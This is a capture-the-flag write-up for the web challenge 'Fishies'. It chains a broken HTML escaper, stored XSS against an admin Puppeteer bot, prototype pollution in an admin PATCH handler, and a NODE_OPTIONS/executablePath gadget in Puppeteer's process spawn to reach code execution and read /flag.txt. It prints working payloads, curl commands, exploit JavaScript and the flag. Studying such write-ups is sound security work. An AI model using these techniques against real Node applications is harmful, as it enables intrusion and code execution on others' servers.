---
title: "Fishies"
ctf: "platypwnies 2026"
date: 2026-11-14
category: web
difficulty: 3
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{h1jack1ng_th3_d3bugg3r_w1th_f1sh13s::2Fvfrje9CS9U}"
---

# Fishies

## Summary

A tiny Express 5 / Handlebars 4.7.10 / Puppeteer 25 web app ("add your own fish, report
bad ones to the admin") collapses all the way to RCE. Four bugs stack:

1. a **hand-rolled escaper** in `server.js` that skips the character *after* every
 escaped `<`/`>` — so `<<` and `><` leak a raw `<` into a `{{{ }}}` `<pre>`;
2. the admin bot renders attacker ASCII with an httpOnly `admin` cookie, giving us
 **admin-origin JS** (stored XSS);
3. the admin-only `PATCH /api/admin/fish/:id/fishData` handler calls a recursive
 `combine` with **no `__proto__` guard** → prototype pollution of `Object.prototype`;
4. the app then calls `puppeteer.launch`, which **spawns a child process** —
 `child_process.spawn` reads `executablePath` and `env` off the polluted prototype,
 so we point the "browser" at an existing Node shebang script and inject
 `NODE_OPTIONS=--import=data:text/javascript,...` to run our module as the app user.

The flag lives at `/flag.txt` in the container and is never read by the app; our imported
module reads it, writes a copy under the served `static/` dir, and also exfiltrates it
through a second channel.

## Solution / Exploit

### 1. The broken escaper → stored XSS

`server.js`:

```js
function escape(value) {
 let escaped = String(value);
 for (let index = 0; index < escaped.length; index++) {
 const replacement = escaped[index] === '<' ? '&lt;' : escaped[index] === '>' ? '&gt;' : null;
 if (!replacement) continue;
 escaped = escaped.slice(0, index) + replacement + escaped.slice(index + 1);
 index += replacement.length; // BUG: skips the char now sitting right after the replacement
 }
 return escaped;
}
```

A `<` becomes the 4-char `&lt;`, which shifts the following character to `index+4`; the
manual `index += 4` plus the loop's `index++` resumes at `index+5`, so **the original
character immediately after a replaced `<`/`>` is never inspected**. Hand-trace:

```
escape("<<") -> "&lt;<" (second < survives raw)
escape("<>") -> "&lt;>" (the > survives raw)
```

`fishView` sets `reviewAscii = escape(fish.ascii)`, and `templates/index.html` renders
it **unescaped** inside a `<pre>`:

```hbs
<pre class="fish-detail__ascii">{{{reviewAscii}}}</pre>
```

So attacker-controlled `ascii` injects a raw HTML tag:

```
<<img src=x onerror=alert(1)//<>
```

`<<` → raw `<`; the trailing `<>` supplies the raw `>` that closes the tag and the stray
`<` is swallowed by the JS `//` comment. Result element:
`<img src=x onerror="alert(1)//<">`.

### 2. Trigger — the admin bot

`POST /api/fish` stores the ascii (any anonymous visitor). `POST /api/fish/:id/report`
makes the Puppeteer bot visit `http://127.0.0.1:80/#fish<id>` **with the httpOnly `admin`
cookie set**; `openFishFromHash` clones the server-rendered `<template id="fish-<id>">`
into the dialog and our `<img onerror>` fires — as admin, same origin (so `fetch`
carries the cookie automatically even though it is httpOnly).

### 3. Admin → prototype pollution

```js
app.patch('/api/admin/fish/:id/fishData', requireAdmin, (req, res) => {
 const fish = fishes.get(Number(req.params.id));
 if (!fish) return res.status(404).send('fish not found');
 combine(fish.fishData, req.body); // recursive, no __proto__ guard
 res.type('text').send('fish data updated');
});

function combine(target, source) {
 if (!obj(target) || !obj(source)) return target;
 for (const key of Object.keys(source)) {
 if (obj(source[key])) {
 if (!target[key]) target[key] = {};
 combine(target[key], source[key]);
 } else {
 target[key] = source[key];
 }
 }
 return target;
}
```

`JSON.parse('{"__proto__":{...}}')` creates an **own** `__proto__` data property, so
`Object.keys` yields it. `obj(source['__proto__'])` is true, `target['__proto__']`
resolves to `Object.prototype` (truthy, so it is not replaced) and `combine` recurses
straight into `Object.prototype`, writing arbitrary keys globally.

### 4. Prototype pollution → RCE via Puppeteer's spawn

Every report spawns a child: `puppeteer.launch(...)` → `child_process.spawn(...)`. Two
options are read from `Object.prototype` on that path:

* `executablePath` — `ChromeLauncher.computeLaunchArguments` destructures it from an
 options object that has **no own** `executablePath`, so the polluted value wins
 (it must pass `existsSync`).
* `env` — `BrowserLauncher.launch` only does `env = process.env` when
 `options.env === undefined`; a polluted `Object.prototype.env` wins and is passed
 straight to `spawn`.

`Object.prototype.shell` does **not** work here (Node's `normalizeSpawnArguments` uses a
null-prototype copy of options), so the classic unquoted-`--user-data-dir=` shell trick
is dead. Instead we point `executablePath` at an existing **JS shebang script**:
`/usr/local/bin/npm` (symlink to `npm-cli.js`, `#!/usr/bin/env node`). The kernel then
runs `/usr/bin/env node <npm-cli.js> <chrome flags>`, and because we control the whole
child environment we set:

```
PATH=/usr/local/bin:/usr/bin:/bin
NODE_OPTIONS=--import=data:text/javascript,<percent-encoded JS>
```

The Chrome flags arrive as **script argv** (not node options), so node starts normally,
processes `NODE_OPTIONS`, and executes our module via `--import` — as the `node` user,
inside the app container.

### 5. Putting it together

Attacker (no auth) adds a fish and reports it:

```bash
curl -s -XPOST $T/api/fish -H 'Content-Type: application/json' \
 -d '{"ascii":"<<img src=x onerror=\"(function{ /* admin JS, see exploit script */ })\">>"}'
curl -s -XPOST $T/api/fish/<id>/report
```

The admin JS runs once as admin and does two things (full source in
`fishies_exploit.js`):

```js
// 1) pollute Object.prototype via the admin PATCH
fetch('/api/admin/fish/1/fishData', {
 method: 'PATCH',
 headers: {'Content-Type': 'application/json'},
 body: JSON.stringify({__proto__: {
 executablePath: '/usr/local/bin/npm',
 env: {
 PATH: '/usr/local/bin:/usr/bin:/bin',
 NODE_OPTIONS: '--import=data:text/javascript,' + encJS,
 },
 }}),
})
// 2) re-trigger puppeteer.launch so the polluted options are consumed,
// which spawns `/usr/bin/env node ...` and runs our --import module
.then( => fetch('/api/fish/1/report', {method: 'POST'}));
```

The imported module:

```js
const fs = await import('node:fs');
const d = fs.readFileSync('/flag.txt', 'utf8');
fs.writeFileSync('/app/static/flagout.txt', d); // channel 1: static file
await fetch('http://127.0.0.1/api/fish', { // channel 2: post back as a fish
 method: 'POST', headers: {'Content-Type': 'application/json'},
 body: JSON.stringify({ascii: d, fishData: {}}),
});
```

Channel 1 (`GET /static/flagout.txt`) is the reliable one:

```
$ curl -s $T/static/flagout.txt
PP{h1jack1ng_th3_d3bugg3r_w1th_f1sh13s::2Fvfrje9CS9U}
```

## Flag(s)

```
PP{h1jack1ng_th3_d3bugg3r_w1th_f1sh13s::2Fvfrje9CS9U}
```

## Notes / Pitfalls

- **`shell` won't work.** The obvious PP→spawn gadget (`Object.prototype.shell=/bin/sh`)
 is neutralised because Node copies options into a null-prototype object before
 `normalizeSpawnArguments`. The `executablePath`+`env`+`NODE_OPTIONS` route is what
 actually lands.
- **`executablePath` must exist.** It is only used if it passes `existsSync`, so pick a
 real file on disk — `/usr/local/bin/npm` is ideal: it exists *and* it is a shebang
 script, i.e. the kernel will hand it to `node`.
- **Non-standard `<`/`>` in the payload.** The raw tag needs a bare `<` and `>` while the
 escaper is still in play: get them from `<<` and `<>`. Inside the JS use single-quoted
 strings and `\x22` for JSON quotes so the double-quoted `onerror=` attribute is never
 broken.
- **The SSRF is a decoy.** `POST /api/admin/fetch` is admin-only and loopback-only — it
 can only reach the app on port 80 (`127.0.0.1`/`localhost`, `http:` only). No inspector
 is reachable (9229/9222 refused); it is a dead end for file read.
- **Bot timing.** `visitFish` sleeps 20 s after navigation, so the injected JS has a
 generous window; the report returns immediately ("review queued") while the bot runs.
- Payload size is capped at 2000 chars for `ascii`; the percent-encoded `data:` URL must
 fit in `NODE_OPTIONS` — keep the module small.
